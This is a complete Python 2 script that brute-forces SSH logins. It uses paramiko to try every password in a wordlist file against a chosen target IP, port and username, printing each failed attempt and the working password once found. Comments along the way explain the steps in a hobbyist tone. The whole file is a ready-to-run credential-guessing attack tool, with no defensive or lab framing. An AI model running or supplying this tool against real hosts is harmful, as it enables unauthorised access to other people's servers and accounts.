#originally written 3 DEC 2018

import sys, paramiko

import optparse

parser = optparse.OptionParser()

parser.add_option('-t', '--target',
	action="store", dest="target",
	help="Enter the IP you want to target", default="0.0.0.0")





parser.add_option('-p', '--port',
	action="store", dest="port",
	help="Port SSH is on, defaults to 22", default="22")


parser.add_option('-u', '--username',
	action="store", dest="username",
	help="Enter the username you want to bruteforce, defaults to admin", default="admin")

parser.add_option('-w', '--password_file',
	action="store", dest="password_file",
	help="Enter the full path of the file with the passwords to test", default="")

options, args = parser.parse_args()

password_file = options.password_file
type(password_file)



target = options.target
type(target)

port = options.port
port = int(port)
type(port)

username = options.username
type(username)




print "Attacking "+ options.target+ " with username "+ options.username+ " and passwords in file " +options.password_file
#displays your choices back to you



def ssh(password, error_message =0):
#creates a function, states the function takes one input, called password
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#complains that the host isnt in your trusted host thing if you dont have this line!

		client.connect(target, port, username=username, password=password)

#makes a connection to the target specified above, using the port specified, the username specified above, and the password fed to the function
		
		
	except paramiko.AuthenticationException:
		error_message = 1
#if the password is wrong set error_message to 1, so we can have the right line of text spat out

	client.close()
	return error_message




password_file = open(password_file)

for i in password_file.readlines():

	password = i.strip("\n")

#\n is a new line character, for some reason when python reads files it adds one in, so to get past this you literally tell it to strip the character when it finds it
	try:
		answer = ssh(password)

		if answer == 0:
			print("Password for " +username+ " is "+password)
			sys.exit(0)
		if answer == 1:
			print("Incorrect password " +password)

	except Exception, e:
		print e
		pass

password_file.close()
